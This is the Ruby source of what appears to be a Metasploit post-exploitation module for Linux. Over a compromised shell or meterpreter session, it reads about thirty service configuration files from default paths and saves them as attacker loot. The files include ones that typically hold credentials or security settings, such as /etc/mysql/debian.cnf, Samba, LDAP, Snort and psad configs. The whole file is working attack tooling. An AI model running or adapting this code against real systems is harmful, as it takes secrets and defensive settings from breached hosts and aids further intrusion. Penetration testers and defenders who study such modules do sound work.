##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Linux::System

  def initialize(info = {})
    super( update_info( info,
      'Name'          => 'Linux Gather Configurations',
      'Description'   => %q{
        This module collects configuration files found on commonly installed
        applications and services, such as Apache, MySQL, Samba, Sendmail, etc.
        If a config file is found in its default path, the module will assume
        that is the file we want.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'ohdae <bindshell[at]live.com>',
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))
  end

  def run
    distro = get_sysinfo

    print_status "Running module against #{session.session_host} [#{get_hostname}]"
    print_status 'Info:'
    print_status "\t#{distro[:version]}"
    print_status "\t#{distro[:kernel]}"

    vprint_status 'Finding configuration files...'
    find_configs
  end

  def save(file, data, ctype='text/plain')
    ltype = 'linux.enum.conf'
    fname = ::File.basename(file)
    loot = store_loot(ltype, ctype, session, data, fname)
    print_good("#{fname} stored in #{loot}")
  end

  def find_configs
    configs = [
      "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf", "/etc/nginx/nginx.conf",
      "/etc/snort/snort.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf",
      "/etc/ufw/sysctl.conf", "/etc/security.access.conf", "/etc/shells",
      "/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/security/access.conf",
      "/etc/gated.conf", "/etc/rpc", "/etc/psad/psad.conf", "/etc/mysql/debian.cnf",
      "/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf",
      "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/openldap.conf",
      "/etc/cups/cups.conf", "/etc/opt/lampp/etc/httpd.conf", "/etc/sysctl.conf",
      "/etc/proxychains.conf", "/etc/cups/snmp.conf", "/etc/mail/sendmail.conf",
      "/etc/snmp/snmp.conf"
    ]

    configs.each do |f|
      output = read_file(f).to_s
      next if output.strip.length == 0
      next if output =~ /No such file or directory/
      save(f, output)
    end
  end
end
